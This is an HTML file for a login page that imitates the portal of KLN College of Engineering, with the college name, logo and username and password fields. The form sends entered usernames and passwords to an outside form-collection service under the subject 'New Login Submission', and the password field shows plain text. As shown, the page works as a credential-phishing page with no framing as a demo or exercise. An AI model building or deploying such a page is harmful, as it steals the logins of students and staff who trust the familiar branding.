<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login | KLN College of Engineering</title>

    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background: #ffffff;
            width: 350px;
            padding: 30px;
            text-align: center;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
        }

        .login-container img {
            width: 80px;
            margin-bottom: 10px;
        }

        .login-container h2 {
            margin-bottom: 20px;
            color: #333;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #0066cc;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #004a99;
        }
    </style>
</head>

<body>

    <div class="login-container">
        <!-- Logo Image -->
        <img src="klnce.jpeg" alt="KLN Logo">

        <!-- College Name -->
        <h2>KLN College of Engineering</h2>

        <!-- Getform Connected Form -->
        <form action="https://getform.io/f/allgqxka" method="POST">

            <!-- Required for Getform -->
            <input type="hidden" name="_subject" value="New Login Submission">

            <input type="text" name="username" placeholder="Username" required>
            <input type="text" name="password" placeholder="Password" required>

            <button type="submit">Login</button>
        </form>
    </div>

</body>
</html>
